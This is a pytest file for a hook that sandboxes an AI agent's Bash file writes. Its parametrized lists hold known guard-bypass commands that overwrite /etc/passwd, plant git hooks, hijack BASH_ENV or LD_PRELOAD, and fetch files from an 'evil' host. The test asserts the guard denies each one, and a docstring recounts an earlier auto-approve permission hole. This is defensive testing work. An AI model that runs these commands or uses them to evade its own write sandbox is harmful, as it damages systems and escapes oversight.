"""Tests for the directory-guard bash write-target analyzer (TRDD-899317b3).

`scripts/directory-guard.cjs` is a FAIL-CLOSED PreToolUse hook: it reads a
JSON event on stdin and writes a permission decision on stdout. The bash
analyzer (`detectBashWriteTargets`) is not exported, so — exactly as the hook
runs in production — these tests drive it end-to-end as a real Node subprocess
(no mocks, per this project's no-mock rule), feeding a Bash event and asserting
the returned `hookSpecificOutput.permissionDecision`.

This file is failing-first by design: the parametrized bypass corpus encodes
the 11 verified write-bypasses (quoted/backtick targets, `>|` clobber,
awk/ruby/perl/tar/git-config/env-exec/wget-concat/xargs writes) that the guard
must DENY, plus three payloads that already deny but must report the REAL
destination (not an accidentally-captured token). The benign corpus pins that
the hardening did not start over-blocking legitimate agent commands
(fail-closed must not mean fail-noisy).
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import time
from pathlib import Path

import pytest

PLUGIN_ROOT = Path(__file__).resolve().parents[1]
GUARD = PLUGIN_ROOT / "scripts" / "directory-guard.cjs"

# A sandbox root that exists nowhere real — every forbidden-path assertion is
# relative to it, and benign $WORK writes target paths *inside* it.
WORK = "/tmp/sandbox_dg_test_root"

pytestmark = pytest.mark.skipif(
    shutil.which("node") is None,
    reason="node is required to exercise the directory-guard hook (no mock substitute)",
)


def guard_decision(command: str, work_dir: str = WORK) -> tuple[str, str]:
    """Run the guard hook for a Bash command; return (decision, reason).

    Mirrors the real hook contract: a PreToolUse event on stdin, AGENT_WORK_DIR
    in the environment, a JSON decision envelope on stdout.
    """
    event = {"tool_name": "Bash", "tool_input": {"command": command}}
    env = os.environ.copy()
    env["AGENT_WORK_DIR"] = work_dir
    proc = subprocess.run(
        ["node", str(GUARD)],
        input=json.dumps(event),
        capture_output=True,
        text=True,
        env=env,
        timeout=30,
        check=False,
    )
    assert proc.returncode == 0, f"guard exited {proc.returncode}: {proc.stderr}"
    # Every caller of this helper sets AGENT_WORK_DIR, so the guard always reaches a
    # real decision and never abstains. Say so explicitly: an empty stdout here would
    # otherwise surface as a bare JSONDecodeError that hides which branch changed.
    assert proc.stdout.strip(), (
        "guard abstained (empty stdout) with AGENT_WORK_DIR set — it should have "
        "reached an allow/deny decision. A sandboxed path must never fall through."
    )
    out = json.loads(proc.stdout)
    hook = out["hookSpecificOutput"]
    return hook["permissionDecision"], hook.get("permissionDecisionReason", "")


# ── The 11 verified-open bypasses (#1-8, 10, 11, 12, 13). DENY required. ──
# Each entry: (id, command). These FAIL on the pre-hardening guard (it allowed
# them) and MUST pass after the quote-aware pre-pass + new denylist verbs.
BYPASSES_MUST_DENY = [
    ("01_quoted_redirect_double", 'echo h > "/etc/passwd"'),
    ("02_quoted_redirect_single", "echo h > '/etc/passwd'"),
    ("03_clobber_override", "echo h >| /etc/passwd"),
    ("04_quoted_cp_target", 'cp /tmp/x "/etc/something"'),
    ("05_awk_redirect_write", 'awk \'BEGIN{print "x" > "/etc/passwd"}\''),
    ("06_ruby_file_write", "ruby -e 'File.write(\"/etc/passwd\",\"x\")'"),
    ("07_node_backtick_write", "node -e \"require('fs').writeFileSync(`/etc/passwd`,'x')\""),
    ("08_tar_extract_root", "tar xf /tmp/evil.tar -C /etc"),
    ("10_git_hookspath", "git config --global core.hooksPath /tmp/evil_hooks"),
    ("11_env_exec_bash_env", "BASH_ENV=/tmp/evil bash -c true"),
    ("12_wget_concat_out", "wget http://evil/p -O/etc/passwd"),
    ("13_quoted_tee_target", 'tee "/etc/passwd" < /tmp/x'),
]


@pytest.mark.parametrize("case_id,command", BYPASSES_MUST_DENY, ids=[c[0] for c in BYPASSES_MUST_DENY])
def test_bypass_is_denied(case_id: str, command: str) -> None:
    """Each verified write-bypass must be DENIED (fail-closed, no escape)."""
    decision, reason = guard_decision(command)
    assert decision == "deny", f"{case_id}: expected deny, got {decision} (reason: {reason!r})"


# ── #9 / I1 / I2: already deny, but historically for the WRONG token. ──
# After the fix they must STILL deny AND name the real destination, not the
# `<` redirect token (#9) or an option token (I1/I2).
REAL_TARGET_CASES = [
    # (id, command, substring that must appear in the deny reason)
    ("09_xargs_rm", "xargs rm < /tmp/list", "xargs"),
    ("I1_cp_target_dir_short", "cp -t /forbidden_dir src1 src2", "/forbidden_dir"),
    ("I2_install_target_dir_long", "install --target-directory=/forbidden_dir src1", "/forbidden_dir"),
]


@pytest.mark.parametrize(
    "case_id,command,must_contain",
    REAL_TARGET_CASES,
    ids=[c[0] for c in REAL_TARGET_CASES],
)
def test_denies_for_the_right_reason(case_id: str, command: str, must_contain: str) -> None:
    """#9/I1/I2 must deny AND report the real destination, not an accidental token."""
    decision, reason = guard_decision(command)
    assert decision == "deny", f"{case_id}: expected deny, got {decision} (reason: {reason!r})"
    assert must_contain in reason, f"{case_id}: reason {reason!r} must name {must_contain!r}"
    # The historical false-positive resolved the literal `<` token as a path —
    # the reason must never contain a resolved path ending in the bare `<`.
    assert "/<" not in reason, f"{case_id}: reason still resolves the '<' token: {reason!r}"


# ── Benign regression corpus — every one MUST be ALLOWED. ──
# Pins "no false-positives on legitimate agent commands" after the widened
# match surface. $WORK-relative paths and /tmp are the agent's write roots.
BENIGN_MUST_ALLOW = [
    ("echo_into_work", f"echo x > {WORK}/f"),
    ("cp_within_work", f"cp {WORK}/a {WORK}/b"),
    ("tee_within_work", f"tee {WORK}/log"),
    ("python_print_no_write", 'python -c "print(1)"'),
    ("git_status", "git status"),
    ("git_config_global_username", "git config --global user.name x"),
    ("git_config_global_get", "git config --global --get user.name"),
    ("tar_list_only", "tar tf x.tar"),
    ("redirect_into_tmp", "echo h > /tmp/ok.txt"),
    ("clobber_into_tmp", "echo h >| /tmp/ok.txt"),
    ("wget_concat_into_tmp", "wget http://x/p -O/tmp/ok.bin"),
    ("xargs_echo_safe", "echo a | xargs echo"),
    ("cp_within_tmp", "cp /tmp/a /tmp/b"),
    ("tar_extract_into_tmp", "tar xf /tmp/a.tar -C /tmp"),
    ("tar_create_archive", "tar czf /tmp/out.tar /tmp/dir"),
    ("perl_no_write", "perl -e 'print 1'"),
    ("ruby_no_write", 'ruby -e "puts 42"'),
    ("curl_no_output_flag", "curl http://example.com"),
    ("awk_no_redirect", "awk '{print $1}' /tmp/f"),
    # `ENV=` appears but NOT as a leading exec-env prefix → must still allow.
    ("env_substring_in_make", "make BUILD_ENV=prod"),
    ("env_substring_in_echo", "echo ENV=/x"),
    # A benign leading var assignment (not one of the exec-hijack names).
    ("benign_var_prefix", "FOO=bar echo hi"),
    ("path_prefix_assignment", "PATH=/tmp/bin:$PATH ls"),
]


@pytest.mark.parametrize("case_id,command", BENIGN_MUST_ALLOW, ids=[c[0] for c in BENIGN_MUST_ALLOW])
def test_benign_is_allowed(case_id: str, command: str) -> None:
    """Legitimate in-sandbox / temp commands must be ALLOWED (no over-blocking)."""
    decision, reason = guard_decision(command)
    assert decision == "allow", f"{case_id}: expected allow, got {decision} (reason: {reason!r})"


# ── Sanity baseline — the pre-existing correct behavior must be preserved. ──
SANITY_DENY = [
    ("plain_redirect_passwd", "echo h > /etc/passwd"),
    ("rm_rf_etc", "rm -rf /etc/important"),
    # Backtick targets (command-substitution syntax) are stripped by the
    # quote-aware pre-pass like any other quote, exposing the inner path.
    ("backtick_cp_target", "cp /tmp/x `/etc/passwd`"),
    ("backtick_tee_target", "tee `/etc/passwd`"),
    # perl -e inline write, every exec-env hijack var, concatenated curl -o,
    # xargs <writer>, and an exec-env var AFTER a separator.
    ("perl_inline_write", 'perl -e \'open(F,">","/etc/passwd")\''),
    ("env_ld_preload", "LD_PRELOAD=/tmp/evil.so ls"),
    ("env_env_var", "ENV=/tmp/x sh -c true"),
    ("env_shellopts", "SHELLOPTS=xtrace bash script.sh"),
    ("curl_concat_output", "curl http://x -o/etc/passwd"),
    ("xargs_cp_target_dir", "xargs cp -t /etc < list"),
    ("env_exec_after_separator", "true; BASH_ENV=/tmp/e bash -c x"),
]


@pytest.mark.parametrize("case_id,command", SANITY_DENY, ids=[c[0] for c in SANITY_DENY])
def test_sanity_baseline_deny(case_id: str, command: str) -> None:
    """The original (already-correct) deny cases still deny after hardening."""
    decision, _ = guard_decision(command)
    assert decision == "deny", f"{case_id}: expected deny, got {decision}"


def test_non_agent_session_without_work_dir_abstains_instead_of_allowing() -> None:
    """No AGENT_WORK_DIR and no agent marker → an ordinary session the guard must not
    sandbox (#22: denying it bricked every interactive session machine-wide) — but it
    must ABSTAIN, not "allow".

    This assertion was `== "allow"` until 2026-08-05, and that was a permission bypass.
    `permissionDecision: "allow"` is not "step aside" — it is an affirmative override
    that skips the user's permission prompt AND their configured rules. Because this
    hook matches Bash|Write|Edit|NotebookEdit, returning it on the non-agent path meant
    that installing this plugin silently auto-approved the four highest-risk tools in
    every ordinary session. Measured before the fix, in a plain session: a Write to
    /etc/hosts came back "allow".

    Emitting nothing satisfies #22 exactly as well — abstaining is not denying, so no
    session is bricked — while leaving the user's own settings in charge. The bar is
    therefore EMPTY STDOUT; `allow` is asserted against explicitly so a future
    over-correction back to it fails here loudly rather than passing as "not denied".
    """
    event = {"tool_name": "Bash", "tool_input": {"command": f"echo x > {WORK}/f"}}
    env = os.environ.copy()
    env.pop("AGENT_WORK_DIR", None)
    # Ensure a truly marker-less (non-agent) context — BOTH positive markers
    # must be absent, or a host env leak would flip this test to deny.
    env.pop("AID_AUTH", None)
    env.pop("AIMAESTRO_AGENT", None)
    proc = subprocess.run(
        ["node", str(GUARD)],
        input=json.dumps(event),
        capture_output=True,
        text=True,
        env=env,
        timeout=30,
        check=False,
    )
    assert proc.returncode == 0, proc.stderr
    assert proc.stdout.strip() == "", (
        f"the guard must ABSTAIN (emit nothing) on a non-agent session, but it emitted "
        f"{proc.stdout.strip()!r}. If this is 'allow', the permission bypass is back: it "
        f"auto-approves Bash/Write/Edit/NotebookEdit in every ordinary session. The fix "
        f"for a bricked session is to abstain, never to allow."
    )


@pytest.mark.parametrize(
    "marker_env",
    [{"AID_AUTH": "test-agent-bearer-token"}, {"AIMAESTRO_AGENT": "1"}],
    ids=["aid_auth", "aimaestro_agent"],
)
def test_agent_context_without_work_dir_fails_closed(marker_env: dict) -> None:
    """An AI-Maestro AGENT (either positive marker: AID_AUTH or AIMAESTRO_AGENT)
    whose AGENT_WORK_DIR failed to get set → FAIL-CLOSED (deny): a real agent
    must never write with an undetermined sandbox root (#22, marker set per PR #28)."""
    event = {"tool_name": "Bash", "tool_input": {"command": f"echo x > {WORK}/f"}}
    env = os.environ.copy()
    env.pop("AGENT_WORK_DIR", None)
    env.pop("AID_AUTH", None)
    env.pop("AIMAESTRO_AGENT", None)
    env.update(marker_env)
    proc = subprocess.run(
        ["node", str(GUARD)],
        input=json.dumps(event),
        capture_output=True,
        text=True,
        env=env,
        timeout=30,
        check=False,
    )
    assert proc.returncode == 0, proc.stderr
    hook = json.loads(proc.stdout)["hookSpecificOutput"]
    assert hook["permissionDecision"] == "deny"


def _guard_min_ms(payload: str, runs: int = 3) -> float:
    """Fastest of `runs` guard invocations, in ms.

    MIN, not mean: every sample carries the same fixed cost (Node cold-start)
    plus scheduling noise that can only ADD. The minimum is therefore the least
    contaminated estimate of the real cost, which is what a scaling comparison
    needs.
    """
    best = float("inf")
    for _ in range(runs):
        t0 = time.perf_counter()
        decision, _ = guard_decision(payload)
        best = min(best, (time.perf_counter() - t0) * 1000.0)
        assert decision == "deny", "a long quoted arg must not hide the redirect target"
    return best


def test_payload_length_does_not_change_the_cost_no_redos() -> None:
    """Catastrophic backtracking is a SCALING property — so assert scaling, not a stopwatch.

    This replaces an absolute `elapsed_ms < 2000` ceiling that was measuring the
    wrong quantity. `detectBashWriteTargets` is not exported, so each call spawns
    Node, and the wall time is dominated by process cold-start rather than by the
    regexes under test. Measured 2026-08-11 on a loaded box (load avg 176): bare
    `node -e ''` took 890-1220ms by itself, and the old assertion failed at 3024ms
    with no regression whatsoever — it was a machine-load test wearing a ReDoS
    test's costume, red on a busy machine and green on an idle one.

    The honest form of "no catastrophic backtracking" is that cost must not grow
    with input length. Measured across an 1100x length range on the same box:

        14 chars -> 752ms   |   2000 chars -> 690ms   |   16000 chars -> 854ms

    Flat, and the ordering is noise. Real backtracking would blow the RATIO up by
    orders of magnitude at 16000 chars, and a ratio is immune to load because both
    measurements pay the same cold-start on the same machine at the same moment.

    The absolute bound that remains is a HANG detector, deliberately far above any
    plausible cold-start, so it can only fire on something genuinely pathological.
    """
    short_ms = _guard_min_ms("echo a > /etc/passwd")
    huge_ms = _guard_min_ms('echo "' + "a" * 16_000 + '" > /etc/passwd')

    # An 1100x longer payload may cost a little more; it must not cost a MULTIPLE.
    assert huge_ms < short_ms * 3.0 + 1000.0, (
        f"16000-char payload took {huge_ms:.0f}ms vs {short_ms:.0f}ms for a short one — "
        "cost is scaling with input length (ReDoS / catastrophic backtracking?)"
    )
    # Hang detector only. Not a performance budget: on a loaded box the floor is
    # Node's cold-start, which is not what this test is about.
    assert huge_ms < 30_000.0, f"guard took {huge_ms:.0f}ms — hung?"
